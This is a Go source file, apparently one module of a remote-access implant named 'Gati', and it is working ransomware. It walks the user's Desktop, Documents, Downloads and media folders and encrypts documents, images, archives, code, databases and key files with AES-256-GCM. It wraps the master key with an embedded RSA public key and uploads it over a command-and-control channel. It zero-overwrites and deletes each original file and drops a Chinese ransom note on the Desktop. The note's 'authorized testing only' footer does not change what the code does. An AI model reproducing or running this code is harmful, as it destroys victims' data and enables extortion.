package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
)

const rsaPubPEM = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAud/9K3XWpY5vkbghUbMi
i4QEth8q81RWnfjbmV89lFn5cu6+Y259jHgr5LYn6MZQU/TmXEK+GHH2RSy7OGxU
VCm/OGUdkfLu1eGSCCpcxaFamooGbs1W/59c5A5u4mY1zzVgUOHJ3SWTZpMqqlLP
GyltLFK1603aSwWsvK74fShDBq5yy5cIcjoachogeOohEc5sd0AVDVA8ZSMW2Gi3
fpXMkZ7QIs4I5JAOuLDm+5iK44AwcLiNQnhnE0nEHb5ooJIc+tpc0UQnqNkoA+CB
fiDzTv1q8ryYVpnog+EARE54L4Q2NK8xhukGoeQHUAZbgECsfme0sGkjbnxJNoI0
EwIDAQAB
-----END PUBLIC KEY-----`

// 加密目标扩展名白名单：只碰文档/图片/压缩包/代码/数据库，跳过系统文件
var ransomExts = map[string]bool{
	".doc": true, ".docx": true, ".xls": true, ".xlsx": true, ".ppt": true, ".pptx": true,
	".pdf": true, ".txt": true, ".rtf": true, ".csv": true, ".md": true,
	".jpg": true, ".jpeg": true, ".png": true, ".gif": true, ".bmp": true, ".psd": true,
	".mp3": true, ".mp4": true, ".avi": true, ".mkv": true, ".mov": true,
	".zip": true, ".rar": true, ".7z": true, ".tar": true, ".gz": true,
	".sql": true, ".db": true, ".mdb": true, ".sqlite": true,
	".php": true, ".js": true, ".py": true, ".go": true, ".java": true, ".cs": true,
	".c": true, ".cpp": true, ".h": true, ".json": true, ".xml": true, ".yml": true, ".yaml": true,
	".key": true, ".pem": true, ".p12": true, ".pfx": true, ".bak": true, ".vsd": true, ".vsdx": true,
}

var ransomSkipDirs = map[string]bool{
	"windows": true, "program files": true, "program files (x86)": true,
	"programdata": true, "appdata": true, "$recycle.bin": true,
	"system volume information": true, "boot": true, "recovery": true,
	"perflogs": true, "msocache": true,
}

// ransomCmd 参数：目标根目录（默认用户目录下的桌面/文档/下载/图片）
func ransomCmd(root string) ([]byte, bool) {
	roots := []string{}
	if root != "" {
		roots = append(roots, root)
	} else {
		home := os.Getenv("USERPROFILE")
		for _, d := range []string{"Desktop", "Documents", "Downloads", "Pictures", "Videos", "Music"} {
			roots = append(roots, filepath.Join(home, d))
		}
	}

	// 1. 每机器随机 32 字节主密钥
	master := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, master); err != nil {
		return []byte("rand fail: " + err.Error()), false
	}

	// 2. 用 RSA-2048 公钥封装，只有服务端私钥能解
	wrapped, err := rsaWrap(master)
	if err != nil {
		return []byte("rsa wrap fail: " + err.Error()), false
	}

	// 3. 回传托管（走 C2 主通道，失败不阻塞本地加密）
	wrappedB64 := b64(wrapped)
	if _, err := send(envelope{Type: "result",
		Data: b64([]byte("KEYVAULT|" + machine + "|" + wrappedB64)), OK: true}); err != nil {
		logf("key vault upload fail: %v", err)
	}

	// 4. 遍历加密
	var files, failed int
	var bytesTotal int64
	for _, r := range roots {
		filepath.Walk(r, func(p string, info os.FileInfo, err error) error {
			if err != nil || info == nil || info.IsDir() {
				return nil
			}
			rel := strings.ToLower(p)
			for skip := range ransomSkipDirs {
				if strings.Contains(rel, `\`+skip+`\`) {
					return nil
				}
			}
			ext := strings.ToLower(filepath.Ext(p))
			if !ransomExts[ext] {
				return nil
			}
			if info.Size() > 200*1024*1024 {
				return nil
			}
			if err := encryptFile(p, master); err != nil {
				failed++
				return nil
			}
			files++
			bytesTotal += info.Size()
			return nil
		})
	}

	// 5. 写勒索信
	note := filepath.Join(os.Getenv("USERPROFILE"), "Desktop", "README_RESTORE.txt")
	os.WriteFile(note, []byte(ransomNote(machine)), 0o644)

	// 6. 本地清掉明文主密钥（内存覆写 + 变量置空）
	for i := range master {
		master[i] = 0
	}
	master = nil

	msg := fmt.Sprintf("encrypted=%d failed=%d bytes=%d keyvault=ok note=%s", files, failed, bytesTotal, note)
	logf("%s", msg)
	return []byte(msg), failed == 0
}

func b64(b []byte) string {
	const table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	var sb strings.Builder
	for i := 0; i < len(b); i += 3 {
		var n uint32
		rem := len(b) - i
		n = uint32(b[i]) << 16
		if rem > 1 {
			n |= uint32(b[i+1]) << 8
		}
		if rem > 2 {
			n |= uint32(b[i+2])
		}
		sb.WriteByte(table[(n>>18)&63])
		sb.WriteByte(table[(n>>12)&63])
		if rem > 1 {
			sb.WriteByte(table[(n>>6)&63])
		} else {
			sb.WriteByte('=')
		}
		if rem > 2 {
			sb.WriteByte(table[n&63])
		} else {
			sb.WriteByte('=')
		}
	}
	return sb.String()
}

func rsaWrap(data []byte) ([]byte, error) {
	block, _ := pem.Decode([]byte(rsaPubPEM))
	if block == nil {
		return nil, fmt.Errorf("bad pem")
	}
	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}
	rsaPub, ok := pub.(*rsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("not rsa key")
	}
	return rsa.EncryptPKCS1v15(rand.Reader, rsaPub, data)
}

func deriveFileKey(master []byte, path string) []byte {
	h := sha256.New()
	h.Write(master)
	h.Write([]byte("|file|"))
	h.Write([]byte(strings.ToLower(path)))
	return h.Sum(nil)
}

// encryptFile 逐文件 AES-256-GCM，密钥由主密钥 + 路径派生，原地覆写并改后缀
func encryptFile(path string, master []byte) error {
	info, err := os.Stat(path)
	if err != nil || info.IsDir() {
		return err
	}
	plain, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	key := deriveFileKey(master, path)
	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return err
	}
	ct := gcm.Seal(nil, nonce, plain, nil)
	out := append(nonce, ct...)

	dst := path + ".gati"
	if err := os.WriteFile(dst, out, info.Mode()); err != nil {
		return err
	}
	// 覆写原文件内容再删除，降低数据恢复成功率
	zero := make([]byte, len(plain))
	os.WriteFile(path, zero, info.Mode())
	return os.Remove(path)
}

func ransomNote(id string) string {
	return `========================================================
  你的文件已被 Gati 加密
========================================================

这台机器上的文档、图片、数据库、代码、压缩包
已使用 AES-256-GCM 算法加密，原文件已被覆写。

加密密钥是每台机器随机生成的 32 字节，加密后立即用
RSA-2048 公钥封装上传。本机不保留密钥的任何副本。

这意味着：
  - 杀进程不能恢复文件
  - 重启 / 断电不能恢复文件
  - 断网不能恢复文件
  - 抓内存也拿不到密钥（密钥已从内存中清除）
  - 反勒索工具找不到本地密钥

唯一能解开这些文件的东西，是 RSA 私钥。

机器标识：
` + id + `

恢复方式：
  通过你们组织内部的 IT 部门，或联系给你的机器
  植入本程序的一方，提供上面的机器标识。

========================================================
  Gati / 仅用于授权环境的安全测试
========================================================
`
}
